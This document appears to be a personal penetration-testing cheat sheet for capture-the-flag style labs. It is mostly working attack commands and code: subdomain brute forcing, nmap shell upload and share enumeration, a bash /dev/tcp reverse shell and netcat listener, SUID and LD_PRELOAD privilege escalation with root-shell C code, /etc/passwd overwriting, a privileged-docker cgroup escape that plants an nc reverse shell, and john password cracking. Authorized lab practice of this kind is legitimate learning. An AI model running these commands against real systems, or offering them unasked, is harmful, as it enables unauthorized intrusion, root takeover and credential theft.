# Pentest

## Enumeration

### **Brute force subdomains**

```bash
gobuster vhost -u cybercrafted.thm -w ~/pentest/wordlists/shubs-subdomains.txt 
```

```bash
wfuzz -c -f sub-fighter.txt -Z \
    -w ~/pentest/wordlists/shubs-subdomains.txt \
    -H "Host: FUZZ.cmess.thm" --hw 290 cmess.thm
```

### nmap

configure firewall to return RST when TCP port scan occurs (TCP SYN is spoofed)

```
iptables -I INPUT -p tcp --dport <port> -j REJECT --reject-with tcp-reset
```

This can make it extremely difficult (if not impossible) to get an accurate reading of the target(s).

nmap scan with `nmap -sU --top-ports 20 <target>` to make it faster for UDP scans.&#x20;

nmap ping sweep : `nmap -sn 192.168.0.1-254`

```
nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php'
```

https://nmap.org/nsedoc/

`-Pn` : don't ping host, avoid windows firewall, treat the host as being alive always use `-vv`, better to have more verbosity

#### Enumerate samba shares

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.170.159
```

#### Enumerate nfs

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.170.159
```

say that `/var` has been found, we can mount it locally like that:

```
mkdir tempnfs
sudo mount TARGET_IP:/var tempnfs
```

### **sqlmap**

in google chrome, open network, select call and and copy request header, paste it to a file req.txt

```
sqlmap -r req.txt 
```

## Networking

#### **Tunneling**

Using socat ([static binaries](https://github.com/andrew-d/static-binaries))

Expose port 22 on 8888 (if 22 is only open to localhost for example)

```
socat -d -d TCP-LISTEN:8888,reuseaddr,fork TCP:localhost:22
```

## File transfer

Sending a file through netcat

```bash
# Receiver
nc -l -p 1234 > out.file

# Sender
nc -w 3 [destination] 1234 < out.file

```

## Reverse shell

```bash
bash -i >& /dev/tcp/10.9.6.147/4242 0>&1
nc -lvnp 4242
```

### Get a pseudo terminal over netcat reverse shell

<pre class="language-bash"><code class="lang-bash">python -c 'import pty;pty.spawn("/bin/bash")' # or
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z , Enter 
<strong>stty raw -echo
</strong>fg
# Enter, Enter
export TERM=xterm-256-color</code></pre>

msfvenom : generate reverse shell #todo

## Privilege escalation

### SUID

#### Find suid

```bash
find / -perm -u=s -type f 2>/dev/null
```

#### Abuse python suid&#x20;

```bash
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

### **Override /etc/passwd**

generate password salt

```
openssl passwd -1 -salt ignite pass123
# $1$ignite$3eTbJm98O9Hz.k1NTdNxe1
```

Replace

```
jessie:x:1000:1000:jessie,,,:/home/jessie:/bin/bash
```

by

```
jessie:$SALT$:1000:1000:jessie,,,:/home/jessie:/bin/bash
```

### Escape docker privileged container to be run as root

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.6.147 4244 >/tmp/f" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### **LD\_PRELOAD**

if you see `env_keep+=LD_PRELOAD` in `sudo -l`, then, create `pe.c` :

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Then compile it using:

```bash
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Finally, escalate privileges running

```bash
sudo LD_PRELOAD=pe.so <COMMAND> # Use any command you can run with sudo
```

## Cracking

### John

have a hash.txt file containing

```
username:hash
```

then run :

```
john --wordlist=~/pentest/wordlist/rockyou.txt --format=raw-md5 hash.txt
```

word mangling: markus --> Markus1, Markus2, Markus3, MArkus, MARkus, MARKus, Markus!

```bash
john --single --format=[format] [path to file]
```

Cracking with salt

in the hash.txt file, put \[HASH]$\[SALT]

```bash
john --wordlist=~/pentest/wordlist/rockyou.txt \
    --format='dynamic=sha512($p.$s)' hash.txt
```

## Escape

Alternative to `cat` :&#x20;

```bash
cp FILE /dev/stdout
```

